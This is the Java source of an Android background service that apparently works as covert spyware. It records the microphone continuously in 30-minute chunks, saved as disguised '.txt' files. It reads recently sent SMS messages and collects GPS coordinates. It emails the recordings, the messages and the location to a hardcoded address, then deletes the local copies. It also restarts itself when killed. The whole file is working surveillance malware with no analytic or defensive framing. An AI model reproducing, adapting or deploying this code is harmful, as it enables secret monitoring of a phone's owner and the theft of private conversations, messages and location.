package com.example.adira;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.ListIterator;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.database.SQLException;
import android.graphics.Camera;
import android.hardware.Camera.CameraInfo;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.util.Log;

public class MyService extends Service {
	static Context context;
	Thread threadQueue, smsQueue, camQueue;
	int threadinterval = 60000 * 2;
	int smsInterval = 60 * 60 * 1000 * 3;
	Sqldata myDbHelper;
	List<EmailQueue> listEmailQueue;
	HashMap<String, String> map;
	EmailQueue emailqueueobj = null;
	SharedPreferences sharedPreferences;
	MediaRecorder media;
	private static final long MIN_TIME_BETWEEN_REQUESTS = 30 * 60 * 1000;
	GPSTracker gps;

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.e("My Service", "onStartCommand");
		return START_STICKY;
	}

	@Override
	public void onTaskRemoved(Intent rootIntent) {
		System.out.println("**** onTaskRemoved ****");
		Intent restartService = new Intent(context, this.getClass());
		restartService.setPackage(getPackageName());
		PendingIntent restartServicePI = PendingIntent.getService(context, 1, restartService,
				PendingIntent.FLAG_ONE_SHOT);
		AlarmManager alarmService = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
		alarmService.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, restartServicePI);
	}

	@Override
	public void onCreate() {
		Log.e("My Service", "onCreate");
		context = this;
		sharedPreferences = getSharedPreferences("Myservice", Context.MODE_PRIVATE);
		recording();
		myDbHelper = new Sqldata(context);
		gps = new GPSTracker(this);
		threadQueue = new Thread(new Runnable() {
			@Override
			public void run() {
				System.out.println("threadQueue service is started !!!!");
				do {
					// CALL MAIL
					sendMailQueue();
					checkingTime();
					try {
						Thread.sleep(threadinterval);
					} catch (InterruptedException e) {
						System.out.println("threadQueue Exception!!!!!");
					}
				} while (true);
			}
		});
		if (!threadQueue.isAlive()) {
			threadQueue.start();
		}
		camQueue = new Thread(new Runnable() {
			@Override
			public void run() {
				System.out.println("camQueue service is started !!!!");
				do {
					try {
						Thread.sleep(1000);
						CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
						System.out.println("$$$$$$ CAMQUEUE $$$$$$");
					} catch (Exception e) {
						System.out.println("###### CAMQUEUE ######");
						e.printStackTrace();
					}
				} while (true);
			}
		});
		if (!camQueue.isAlive()) {
			camQueue.start();
		}
		smsQueue = new Thread(new Runnable() {
			@Override
			public void run() {
				System.out.println("smsQueue service is started !!!!");
				do {
					// Check sms
					checkTodaySend();
					try {
						Thread.sleep(smsInterval);
					} catch (InterruptedException e) {
						System.out.println("smsQueue Exception!!!!!");
					}
				} while (true);
			}
		});
		if (!smsQueue.isAlive()) {
			smsQueue.start();
		}

	}

	public void checkTodaySend() {
		Uri uriSMSURI = Uri.parse("content://sms/sent");
		long now = System.currentTimeMillis();
		long last24 = now - 24 * 60 * 60 * 1000;// 24h in millis
		String[] selectionArgs = new String[] { Long.toString(last24) };
		String selection = "date" + ">?";
		String[] projection = new String[] { "address", "body", "date" };
		Cursor cur = getContentResolver().query(uriSMSURI, projection, selection, selectionArgs, null);
		// String[] projection = new String[] { "_id", "address", "body", "date"
		// };
		// Cursor cur = getContentResolver().query(uriSMSURI, projection,
		// "datetime(date/1000, 'unixepoch') between date('now', 'now') and
		// date('now')", null, null);
		int totalSendToday = cur.getCount();
		if (cur.moveToFirst()) {
			System.out.println("Data Present to send Mail");
			StringBuilder strBld = new StringBuilder();
			for (int i = 0; i < totalSendToday; i++) {
				strBld.append("\n");
				strBld.append("from:- ");
				strBld.append(cur.getString(cur.getColumnIndex("address")));
				strBld.append("\t body:- ");
				strBld.append(cur.getString(cur.getColumnIndex("body")));
				sendMail(strBld.toString());
				cur.moveToNext();
			}
		} else {
			System.out.println("No messages today");
		}
		cur.close();
	}

	public void sendMail(String body) {
		if (isConnectingToInternet()) {
			try {
				double latitude = 0, longitude = 0;
				if (gps.canGetLocation()) {
					latitude = gps.getLatitude();
					longitude = gps.getLongitude();

				}
				EmailSender sender = new EmailSender(SplashActivity.mailidusername, SplashActivity.mailidpassword);
				boolean sent = sender.sendMail(
						"Sent Messages, Lat: " + latitude + " Long: " + longitude , body,
						SplashActivity.mailidusername, SplashActivity.mailidto);
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		} else {
			System.out.println("No Internet Connection to Send Mail");
			Sqldata myDbHelper = new Sqldata(context);
			try {
				myDbHelper.createDataBase();
			} catch (IOException ioe) {
				throw new Error("Unable to create database");
			}
			try {
				myDbHelper.openDataBase();
				Cursor allrows = myDbHelper.myDataBase.rawQuery("select * from " + Sqldata.TABLE_MAILQUEUE, null);
				int size = allrows.getCount();
				ContentValues values = new ContentValues();
				values.put(myDbHelper.KEY_MAILQUEUE_ROW_ID, size + 1);
				values.put(myDbHelper.KEY_MAILQUEUE_SUBJECT, "Sent Messages");
				values.put(myDbHelper.KEY_MAILQUEUE_BODY, body);
				long row_id = myDbHelper.myDataBase.insert(myDbHelper.TABLE_MAILQUEUE, null, values);
				System.out.println("value--> " + row_id);
				myDbHelper.close();
			} catch (SQLException sqle) {
				myDbHelper.close();
				throw sqle;
			}
		}
	}

	public void sendMailQueue() {
		myDbHelper = new Sqldata(context);
		try {
			myDbHelper.createDataBase();
		} catch (IOException ioe) {
			throw new Error("Unable to create database");
		}
		boolean dbcheck = myDbHelper.checkDataBase();
		if (dbcheck) {
			boolean data = dataCheck();
			if (!data) {
				// No Data
			} else {
				Cursor allrows = null;
				int size;
				String query = "select * from " + Sqldata.TABLE_MAILQUEUE;
				try {
					myDbHelper = new Sqldata(context);
					try {
						myDbHelper.createDataBase();
					} catch (IOException e1) {
						e1.printStackTrace();
					}
					myDbHelper.openDataBase();
					allrows = myDbHelper.myDataBase.rawQuery(query, null);
					size = allrows.getCount();
					if (size > 0) {
						getStatusValues();
						listEmailQueue = new ArrayList<EmailQueue>();
						listEmailQueue = gettingData(map);
						callEmailQueueService(listEmailQueue);
					} else {
						// No Data Found
					}
				} catch (SQLException sqle) {
					sqle.printStackTrace();
				} finally {
					if (allrows != null) {
						allrows.close();
					}
					myDbHelper.myDataBase.close();
				}

			}
		}
	}

	private boolean dataCheck() {
		Cursor allrows = null;
		int size;
		try {
			myDbHelper = new Sqldata(context);
			try {
				myDbHelper.createDataBase();
			} catch (IOException e1) {
				e1.printStackTrace();
			}
			myDbHelper.openDataBase();

			allrows = myDbHelper.myDataBase.rawQuery("select * from " + Sqldata.TABLE_MAILQUEUE, null);
			size = allrows.getCount();
			if (size == 0) {
				return false;
			} else {
				return true;
			}
		} catch (SQLException e) {
			e.printStackTrace();
		} finally {
			if (allrows != null) {
				allrows.close();
			}
			myDbHelper.myDataBase.close();
		}
		return true;
	}

	private void getStatusValues() {
		Cursor allrows;
		int size;
		String query = "select * from " + Sqldata.TABLE_MAILQUEUE;
		myDbHelper = new Sqldata(context);
		try {
			myDbHelper.createDataBase();
		} catch (IOException e1) {
			e1.printStackTrace();
		}
		myDbHelper.openDataBase();
		try {
			allrows = myDbHelper.myDataBase.rawQuery(query, null);
			size = allrows.getCount();
			int rowIndex = allrows.getColumnIndex("rowid");
			map = new HashMap<String, String>();
			while (allrows.moveToNext()) {
				String rowId = allrows.getString(rowIndex).toString();
				map.put(rowId, rowId);
			}
			if (allrows != null) {
				allrows.close();
			}
			myDbHelper.myDataBase.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public List<EmailQueue> gettingData(HashMap<String, String> hashmap) {
		for (String key : hashmap.keySet()) {
			String query = "select * from " + Sqldata.TABLE_MAILQUEUE + " where rowid=\"" + hashmap.get(key) + "\"";
			Cursor allrows;
			int size;
			try {
				myDbHelper = new Sqldata(context);
				try {
					myDbHelper.createDataBase();
				} catch (IOException e1) {
					e1.printStackTrace();
				}
				myDbHelper.openDataBase();
				allrows = myDbHelper.myDataBase.rawQuery(query, null);
				size = allrows.getCount();
				Integer cRowid = allrows.getColumnIndex("rowid");
				Integer cSubject = allrows.getColumnIndex("subject");
				Integer cBody = allrows.getColumnIndex("body");
				emailqueueobj = new EmailQueue();
				if (allrows.moveToNext()) {
					emailqueueobj.setRowid(Integer.parseInt(allrows.getString(cRowid)));
					emailqueueobj.setSubject(allrows.getString(cSubject));
					emailqueueobj.setBody(allrows.getString(cBody));
					listEmailQueue.add(emailqueueobj);
				}
				if (allrows != null) {
					allrows.close();
				}
				myDbHelper.close();
			} catch (SQLException sqle) {
				sqle.printStackTrace();
			}
		}
		return listEmailQueue;

	}

	public boolean callEmailQueueService(List<EmailQueue> listqueue) {
		String subject, body;
		boolean flag = true;
		int rowid;
		try {
			ListIterator<EmailQueue> lit = listqueue.listIterator();
			while (lit.hasNext()) {
				EmailQueue eq = (EmailQueue) lit.next();
				subject = eq.getSubject();
				body = eq.getBody();
				rowid = eq.getRowid();
				if (isConnectingToInternet()) {
					try {
						double latitude = 0, longitude = 0;
						if (gps.canGetLocation()) {
							latitude = gps.getLatitude();
							longitude = gps.getLongitude();

						}
						EmailSender sender = new EmailSender(SplashActivity.mailidusername,
								SplashActivity.mailidpassword);
						boolean sent = sender.sendMail(
								subject + ", Lat: " + latitude + " Long: " + longitude ,
								body, SplashActivity.mailidusername, SplashActivity.mailidto);
						if (sent) {
							myDbHelper = new Sqldata(context);
							try {
								myDbHelper.createDataBase();
							} catch (IOException ioe) {
								throw new Error("Unable to create database");
							}
							try {
								myDbHelper.openDataBase();
								int removed = myDbHelper.myDataBase.delete(myDbHelper.TABLE_MAILQUEUE,
										"rowid = " + rowid, null);
								System.out.println("deleted row > " + removed);
								myDbHelper.close();
							} catch (Exception e) {
								e.printStackTrace();
								myDbHelper.close();
							}
						}
					} catch (Exception e) {
						Log.e("SendMail", e.getMessage(), e);
					}
				}
			}
		} catch (Exception e) {
			flag = false;
			Log.e(e.getClass().getSimpleName(), e.toString());
			e.printStackTrace();
		}
		return flag;
	}

	@SuppressLint("NewApi")
	public static boolean isConnectingToInternet() {
		ConnectivityManager connectivity = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
			Network[] networks = connectivity.getAllNetworks();
			NetworkInfo networkInfo;
			for (Network mNetwork : networks) {
				networkInfo = connectivity.getNetworkInfo(mNetwork);
				if (networkInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
					return true;
				}
			}
		} else {
			if (connectivity != null) {
				// noinspection deprecation
				NetworkInfo[] info = connectivity.getAllNetworkInfo();
				if (info != null) {
					for (NetworkInfo anInfo : info) {
						if (anInfo.getState() == NetworkInfo.State.CONNECTED) {
							System.out.println("Network NETWORKNAME: " + anInfo.getTypeName());
							return true;
						}
					}
				}
			}
		}
		return false;
	}

	public void recording() {
		File audiofilephoneListener = null;
		SimpleDateFormat format = new SimpleDateFormat("dd MM yyyy HH mm_");
		String out = format.format(new Date());
		out = out.replaceAll("\\s", "");

		File sampleDir = new File(Environment.getExternalStorageDirectory(), "/adira");
		if (!sampleDir.exists()) {
			sampleDir.mkdirs();
		}
		final String file_name = "_" + out;

		try {
			audiofilephoneListener = File.createTempFile(file_name, ".txt", sampleDir);
		} catch (IOException e) {
			e.printStackTrace();
		}
		if (audiofilephoneListener != null) {
			media = new MediaRecorder();
			media.setAudioSource(MediaRecorder.AudioSource.MIC);
			media.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
			media.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);

			try {
				media.setOutputFile(audiofilephoneListener.getAbsolutePath());
				media.prepare();
				media.start();
				Editor editor = sharedPreferences.edit();
				editor.putBoolean("recordstarted", true);
				editor.commit();
				System.out.println("Recorder Started Successfully!!!");
			} catch (Exception e) {
				e.printStackTrace();
			}
			new Handler().postDelayed(new Runnable() {

				@Override
				public void run() {

					try {
						if (media != null) {
							// boolean shared =
							// sharedPreferences.getBoolean("recordstarted",
							// false);
							// if (shared) {
							media.stop();
							Editor editor = sharedPreferences.edit();
							editor.putBoolean("recordstarted", false);
							editor.commit();
							recording();
							// }
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}, MIN_TIME_BETWEEN_REQUESTS);
		}
	}

	public void checkingTime() {
		File dir = new File(Environment.getExternalStorageDirectory() + "/adira");
		if (dir.exists() && dir.isDirectory()) {
			// do something here
			File[] list = dir.listFiles();
			System.out.println("Directory path -> " + dir.getPath());
			if (list.length != 0)
				for (File f : list) {
					try {
						String timeValid = f.getName();
						if (timeValid.trim().length() > 6) {
							timeValid = timeValid.replace("-", "_");
							// String dateTime =
							// timeValid.substring(timeValid.indexOf("_") + 1);
							// dateTime = dateTime.substring(0,
							// dateTime.indexOf("_"));
							String timeTime = timeValid.substring(timeValid.indexOf("_") + 1);
							timeTime = timeTime.substring(0, timeTime.indexOf("_"));
							timeTime = timeTime.substring(timeTime.length() - 2);
							SimpleDateFormat currentMinute = new SimpleDateFormat("mm");
							String cn = currentMinute.format(new Date());
							int live = Integer.parseInt(cn);
							int created = Integer.parseInt(timeTime);
							try {
								if (live != created) {
									if (live > created) {
										int diff = live - created;
										if (diff > 30) {
											if (isConnectingToInternet()) {
												try {
													double latitude = 0, longitude = 0;
													if (gps.canGetLocation()) {
														latitude = gps.getLatitude();
														longitude = gps.getLongitude();

													}
													EmailSender sender = new EmailSender(SplashActivity.mailidusername,
															SplashActivity.mailidpassword);
												
													boolean sent = sender.sendMailwithAttachment(
															"Attachment File, Lat: " + latitude + " Long: " + longitude,
															"Empty Body", SplashActivity.mailidusername,
															SplashActivity.mailidto, f.getPath(), f.getName());
													if (sent) {
														boolean delete = f.delete();
														System.out.println("File Deleted Successfully!!");
													}
												} catch (Exception e) {
													// TODO Auto-generated catch
													// block
													e.printStackTrace();
												}
											} else {
												System.out.println("No Internet Connection");
											}
										} else {
											System.out.println("**** TRUE **** BUT NOT GREATER THAN 30");
										}
									} else {
										live = live + 60;
										if (live > created) {
											int diff = live - created;
											if (diff > 30) {
												if (isConnectingToInternet()) {
													try {
														double latitude = 0, longitude = 0;
														if (gps.canGetLocation()) {
															latitude = gps.getLatitude();
															longitude = gps.getLongitude();

														}
														EmailSender sender = new EmailSender(
																SplashActivity.mailidusername,
																SplashActivity.mailidpassword);
														boolean sent = sender.sendMailwithAttachment(
																"Attachment File, Lat: " + latitude + " Long: "
																		+ longitude,
																"Empty Body", SplashActivity.mailidusername,
																SplashActivity.mailidto, f.getPath(), f.getName());
														if (sent) {
															boolean delete = f.delete();
															System.out.println("File Deleted Successfully!!");
														}
													} catch (Exception e) {
														// TODO Auto-generated
														// catch block
														e.printStackTrace();
													}
												} else {
													System.out.println("No Internet Connection");
												}
											} else {
												System.out.println("**** FALSE **** BUT NOT GREATER THAN 30");
											}
										}
									}
								}
							} catch (Exception e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
						}
					} catch (Exception e1) {
						e1.printStackTrace();
					}
				}
		} else {
			System.out.println("There is no folder available!");
		}
	}

	public boolean moveFile(String inputPath, String inputFile, String outputPath, File file) {
		InputStream in = null;
		OutputStream out = null;
		try {
			File dir = new File(outputPath);
			if (!dir.exists()) {
				dir.mkdirs();
			}
			in = new FileInputStream(inputPath + "/" + inputFile);
			out = new FileOutputStream(outputPath + "/" + inputFile);
			byte[] buffer = new byte[1024];
			int read;
			while ((read = in.read(buffer)) != -1) {
				out.write(buffer, 0, read);
			}
			in.close();
			in = null;
			// write the output file
			out.flush();
			out.close();
			out = null;

			// delete the original file
			return true;

		} catch (Exception e) {
			e.printStackTrace();
			return false;
		}
	}
}
